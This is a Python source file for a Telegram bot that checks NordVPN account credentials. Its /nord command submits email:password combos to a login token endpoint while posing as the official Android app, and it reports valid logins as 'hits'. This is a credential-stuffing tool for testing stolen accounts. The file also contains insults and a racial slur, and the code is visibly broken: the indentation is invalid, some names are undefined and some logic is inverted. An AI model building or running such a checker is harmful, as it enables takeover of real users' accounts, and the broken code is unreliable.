import os
import telethon
import requests
from telethon import TelegramClient, events, functions, Button
from telethon.tl.functions.users import GetFullUserRequest
from loggers import logging
from Config import Config
from broadcast_sql import add_usersid_in_db, already_added, get_all_users

bot = TelegramClient("bot", api_id=Config.API_ID, api_hash=Config.API_HASH)
UltraBot = bot.start(bot_token=Config.BOT_TOKEN)
sedpath = "./starkgangz/"
if not os.path.isdir(sedpath):
    os.makedirs(sedpath)

if not os.path.isdir(Config.DL_LOCATION):
    os.makedirs(Config.DL_LOCATION)

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}

@UltraBot.on(events.NewMessage(pattern="^/nord ?(.*)"))
async def Devsexpo(event):
    if event.sender_id != Config.OWNER_ID:
        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
        if rip is False:
            await event.reply(
                "**To Use This Bot, Please Join My Channel. :)**",
                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
            )
            return
    input_str = event.pattern_match.group(1)
    
    if input_str:
        if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**PLEASE ENTER in email:password Format!**")
                return
        else:
            await event.reply("**Send Combo in the Email:Pass Format**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
            headers=data,
            json=sedlyf,
        ).json()
        if meke.get("token"):
            await event.reply("`Yay, This is A Hit.`")
        else:
            await event.reply("`So Sad, This is Invalid Account.`")
        
@UltraBot.on(events.NewMessage(func=lambda e: e.is_private))
async def real_nigga(event):
    if already_added(event.sender_id):
        pass
    elif not already_added(event.sender_id):
        add_usersid_in_db(event.sender_id)
        await UltraBot.send_message(
            Config.LOG_CHAT, f"**New User :** `{event.sender_id}`"
        )


@UltraBot.on(events.ChatAction())
async def _(event):
    if event.chat_id == Config.LOG_CHAT:
        return
    okbruh = await UltraBot.get_me()
    if event.user_joined or event.user_added == str(okbruh):
        lol = event.chat_id
        if already_added(event.chat_id):
            pass
        elif not already_added(event.chat_id):
            add_usersid_in_db(event.chat_id)
            await UltraBot.send_message(Config.LOG_CHAT, f"**New ChatGroup :** `{lol}`")

@UltraBot.on(events.NewMessage(pattern="^/start ?(.*)"))
async def atomz(event):
    replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
    firstname = replied_user.user.first_name
    await event.reply(f"""
    **Hey, {firstname} !,
    Welcome To The NordVpn Checker Bot
    
    To Know About commands type:
    /help

    Bot Made With ❤️ By @Dynamic_bots**
    """)
    
@UltraBot.on(events.NewMessage(pattern="^/leave ?(.*)"))
async def bye(event):
    if not event.sender_id != Config.OWNER_ID:
        await event.reply('`Fuck Off :/`')
        return
    okbruh = await chatbot.get_me()
    await event.reply('Time To leave :(')
    await UltraBot.kick_participant(event.chat_id, okbruh.id)
                
@UltraBot.on(events.NewMessage(pattern="^/help ?(.*)"))
async def no_help(event):
    replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
    firstname = replied_user.user.first_name
    lol_br = """
    /start - To Restart Bot !!
    /help - To Show This.
    /nord xxxx@xxx.com:xxxxxx - To Check the provided Nord Vpn Account

    Share And Support Us❤️❤️
    """
    await event.reply(f'**Hey, {firstname} !, My Commands Are As Follows:- \n{lol_br}**')
                
@UltraBot.on(events.NewMessage(pattern="^/broadcast ?(.*)"))
async def atomz(event):
    error_count = 0
    msgtobroadcast = event.pattern_match.group(1)
    if event.sender_id != Config.OWNER_ID:
        event.reply("**Fuck OFF Bitch !**")
        return
    hmm = get_all_users()
    for starkcast in hmm:
        try:
            await UltraBot.send_message(int(starkcast.chat_id), msgtobroadcast)
        except BaseException:
            error_count += 1
    sent_count = error_count - len(hmm)
    await UltraBot.send_message(
        event.chat_id,
        f"Broadcast Done in {sent_count} Group/Users and I got {error_count} Error and Total Number Was {len(userstobc)}",
    )


async def check_him(chnnl_id, chnnl_link, starkuser):
    if not Config.JTU_ENABLE:
        return True
    try:
        result = await UltraBot(
            functions.channels.GetParticipantRequest(
                channel=chnnl_id, user_id=starkuser
            )
        )
        return True
    except telethon.errors.rpcerrorlist.UserNotParticipantError:
        return False


print("Bot Is Alive.")


def startbot():
    UltraBot.run_until_disconnected()


if __name__ == "__main__":
    startbot()
